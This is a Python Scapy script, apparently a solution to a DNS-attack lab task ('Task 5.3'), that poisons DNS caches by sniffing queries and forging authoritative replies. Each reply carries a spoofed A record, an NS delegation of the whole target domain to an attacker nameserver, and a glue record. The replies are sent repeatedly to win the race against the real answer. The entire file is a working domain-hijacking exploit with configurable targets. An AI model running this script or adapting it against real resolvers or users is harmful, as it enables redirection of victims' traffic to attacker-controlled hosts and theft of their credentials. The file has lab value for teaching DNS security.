#!/usr/bin/env python3
"""DNS NS Record Spoofing for Task 5.3

This script injects Authority (NS) records to redirect an entire domain
to the attacker's nameserver. Once cached, all queries for hostnames under
the target domain will be resolved through the attacker NS.

Usage:
  python3 dns_spoof_ns.py --iface br-xxxx --domain example.com --attacker-ns ns.attacker32.com --attacker-ns-ip 10.9.0.153
"""

from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sniff, send, conf
import argparse
import logging
import sys


def make_ns_spoof_handler(target_domain: str, attacker_ns: str, attacker_ns_ip: str, spoof_ip: str, retries: int = 1):
    """Create a packet handler that injects NS records pointing to attacker nameserver"""
    target_domain = target_domain.rstrip('.').lower()
    
    def _handler(pkt):
        try:
            if DNS not in pkt:
                return
            
            if not hasattr(pkt[DNS], 'qd') or pkt[DNS].qd is None:
                return
            
            qname = pkt[DNS].qd.qname.decode('utf-8').rstrip('.').lower()
            
            # Match queries for the target domain or any subdomain
            if target_domain not in qname:
                return
            
            logging.info('Matched DNS query for %s from %s', qname, pkt[IP].src)
            
            # Build spoofed reply with Answer + Authority (NS) + Additional (glue)
            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
            udp = UDP(dport=pkt[UDP].sport, sport=53)
            
            # Answer section: A record for the queried name
            ans = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata=spoof_ip)
            
            # Authority section: NS record delegating the domain to attacker NS
            ns_record = DNSRR(rrname=target_domain, type='NS', ttl=259200, rdata=attacker_ns)
            
            # Additional section: Glue record (A record for the attacker NS)
            ns_glue = DNSRR(rrname=attacker_ns, type='A', ttl=259200, rdata=attacker_ns_ip)
            
            # Build DNS response with aa=1 (authoritative), qr=1 (response)
            dns = DNS(
                id=pkt[DNS].id,
                qd=pkt[DNS].qd,
                aa=1,  # Authoritative answer
                rd=0,  # Recursion not desired
                qr=1,  # Query response
                qdcount=1,
                ancount=1,  # 1 answer
                nscount=1,  # 1 authority (NS)
                arcount=1,  # 1 additional (glue)
                an=ans,
                ns=ns_record,
                ar=ns_glue
            )
            
            spoof = ip/udp/dns
            
            # Send multiple copies to win race
            for i in range(retries):
                send(spoof, verbose=False)
            
            if retries > 1:
                logging.info('Sent %d spoofed replies with NS record: %s -> %s', retries, target_domain, attacker_ns)
            else:
                logging.info('Sent spoofed reply with NS record: %s -> %s', target_domain, attacker_ns)
        
        except Exception:
            logging.exception('Error handling packet')
    
    return _handler


def parse_args():
    p = argparse.ArgumentParser(description='DNS NS Record Spoofing for Task 5.3')
    p.add_argument('--iface', '-i', required=True, help='Interface to sniff on (e.g., br-xxxx)')
    p.add_argument('--domain', '-d', default='example.com', help='Target domain to hijack (default: example.com)')
    p.add_argument('--attacker-ns', default='ns.attacker32.com', help='Attacker nameserver hostname (default: ns.attacker32.com)')
    p.add_argument('--attacker-ns-ip', default='10.9.0.153', help='Attacker nameserver IP (default: 10.9.0.153)')
    p.add_argument('--spoof-ip', '-s', default='10.0.2.5', help='IP to return in Answer section (default: 10.0.2.5)')
    p.add_argument('--retries', '-r', type=int, default=3, help='Number of spoofed replies per match (default: 3)')
    p.add_argument('--target-resolver', action='store_true', help='Target resolver->authoritative queries (recommended for cache poisoning)')
    return p.parse_args()


def main():
    args = parse_args()
    
    logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
    
    logging.info('=== Task 5.3: NS Record Spoofing (Domain Hijacking) ===')
    logging.info('Using interface: %s', args.iface)
    logging.info('Target domain: %s', args.domain)
    logging.info('Attacker NS: %s (%s)', args.attacker_ns, args.attacker_ns_ip)
    logging.info('Spoof IP: %s', args.spoof_ip)
    logging.info('Retries: %d', args.retries)
    
    # Set BPF filter
    if args.target_resolver:
        bpf_filter = 'udp and src host 10.9.0.53 and dst port 53'
        logging.info('Mode: Resolver->Authoritative (poisoning resolver cache)')
    else:
        bpf_filter = 'udp and dst port 53'
        logging.info('Mode: User->Resolver (poisoning user)')
    
    logging.info('BPF filter: %s', bpf_filter)
    
    handler = make_ns_spoof_handler(args.domain, args.attacker_ns, args.attacker_ns_ip, args.spoof_ip, args.retries)
    
    logging.info('Starting packet sniffing...')
    
    try:
        sniff(iface=args.iface, filter=bpf_filter, prn=handler, store=0)
    except KeyboardInterrupt:
        logging.info('Interrupted by user, exiting')
        sys.exit(0)


if __name__ == '__main__':
    main()
